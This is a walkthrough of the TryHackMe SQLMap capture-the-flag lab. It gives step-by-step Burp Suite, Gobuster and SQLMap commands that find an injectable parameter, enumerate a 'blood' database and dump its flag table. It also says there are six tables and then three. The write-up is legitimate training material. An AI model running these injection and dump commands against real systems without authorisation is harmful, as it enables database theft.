<body>
    <h1>SQLMap Lab Walkthrough</h1>
    <h2>Introduction</h2>
    <p>This guide will walk you through the TryHackMe SQLMap lab, teaching you how to use SQLMap to find and exploit SQL injection vulnerabilities. Ensure you have access to TryHackMe and the necessary tools installed (OpenVPN, Burp Suite, and Gobuster).</p>
    <h2>Prerequisites</h2>
    <ul>
        <li><strong>TryHackMe Account:</strong> Ensure you have an account on TryHackMe.</li>
        <li><strong>OpenVPN:</strong> Install and configure OpenVPN to connect to TryHackMe servers.</li>
        <li><strong>Burp Suite:</strong> Install Burp Suite for intercepting web traffic.</li>
        <li><strong>Gobuster:</strong> Install Gobuster for directory enumeration.</li>
        <li><strong>SQLMap:</strong> Install SQLMap for SQL injection testing.</li>
    </ul>
    <h2>Steps</h2>
    <ol>
        <li><strong>Connect to TryHackMe</strong>
            <p>Download the VPN configuration file from TryHackMe and connect using OpenVPN:</p>
            <pre><code>sudo openvpn --config your-vpn-config.ovpn</code></pre>
        </li>
        <li><strong>Access the SQLMap Challenge</strong>
            <p>Open a web browser and go to the IP address provided after starting the machine on TryHackMe.</p>
            <p>You will see an nginx web server.</p>
            <img width="639" alt="Screenshot 2024-05-22 at 2 46 19 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/665894c3-6559-42c3-814b-5347ff53b76e">
        </li>
        <li><strong>Identify the Vulnerable Parameter</strong>
            <p><strong>Using Burp Suite:</strong></p>
            <ul>
                <li>Open Burp Suite and set up the proxy to intercept the web traffic.</li>
                <li>Intercept a request from the nginx web server.</li>
                <li>Save the intercepted request to a text file (e.g., <code>request.txt</code>).</li>
                <img width="801" alt="Screenshot 2024-05-22 at 2 49 23 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/bf028fbc-9d4b-486d-b8d9-c9915836e27b">
            </ul>
            <p><strong>Using Gobuster:</strong></p>
            <ul>
                <li>Open a terminal and use Gobuster to enumerate directories:</li>
                <pre><code>gobuster dir -u http://&lt;IP_ADDRESS&gt; -w /path/to/wordlist -t 30</code></pre>
                <li>Note the vulnerable parameter found (e.g., <code>blood_group</code>).</li>
                <img width="1166" alt="Screenshot 2024-05-22 at 3 07 28 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/e14bc989-8be7-4980-bbe2-e69b365e90d5">
            </ul>
        </li>
        <li><strong>Run SQLMap</strong>
            <p>Open a terminal and run SQLMap using the saved request file:</p>
            <pre><code>sqlmap -r request.txt -p blood_group --dbs</code></pre>
            <p>SQLMap will enumerate the databases and list them. You will find that there are 6 tables in the <code>blood</code> database.</p>
            <img width="1166" alt="Screenshot 2024-05-22 at 2 53 17 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/7b100d56-539d-4c9b-bb9e-21b0ccdd81b9">
            <img width="1166" alt="Screenshot 2024-05-22 at 2 53 46 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/0a20f8da-5e4e-45bb-aa9b-0cf7d73761fc">
        </li>
        <li><strong>Enumerate the Blood Database</strong>
            <p>Further enumerate the <code>blood</code> database to find its tables:</p>
            <pre><code>sqlmap -r request.txt -D blood --tables</code></pre>
            <p>SQLMap will list 3 tables.</p>
            <img width="1166" alt="Screenshot 2024-05-22 at 2 55 25 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/c27df59f-c5f9-456d-b0e5-5c02cd29088a">
            <img width="1166" alt="Screenshot 2024-05-22 at 2 55 40 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/373f6202-3bd8-4521-9c79-39c3731cae6f">
        </li>
        <li><strong>Enumerate the Users Table</strong>
            <p>Target the <code>users</code> table to find more information:</p>
            <pre><code>sqlmap -r request.txt -D blood -T users --current-user</code></pre>
            <p>SQLMap will reveal that the current user is <code>root</code>.</p>
            <img width="1166" alt="Screenshot 2024-05-22 at 2 57 12 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/b5be0a9a-1123-4cc6-852d-0c708432195a">               <img width="953" alt="Screenshot 2024-05-22 at 2 57 45 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/34295829-578c-40c4-ad52-f600f69be99f">
        </li>
        <li><strong>Dump the Flag Table</strong>
            <p>Finally, enumerate the <code>flag</code> table to obtain the flag:</p>
            <pre><code>sqlmap -r request.txt -D blood -T flag --dump-all</code></pre>
            <p>SQLMap will dump the contents of the <code>flag</code> table, revealing the flag needed to complete the room.</p>
            <img width="1166" alt="Screenshot 2024-05-22 at 2 58 42 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/10a3014a-5fc8-4dea-ae17-c1fb8318c33c">
        </li>
    </ol>
    <h2>Conclusion</h2>
    <p>By following these steps, you can successfully use SQLMap to exploit SQL injection vulnerabilities in the TryHackMe SQLMap lab. Remember to replace placeholder values with actual data from your lab environment.</p>
    <img width="1169" alt="Screenshot 2024-05-22 at 3 00 09 AM" src="https://github.com/Fabiany-cs/SQLMAP/assets/107880960/2de31781-5079-496e-a973-b4bbe5b98d4d">
</body>
</html>
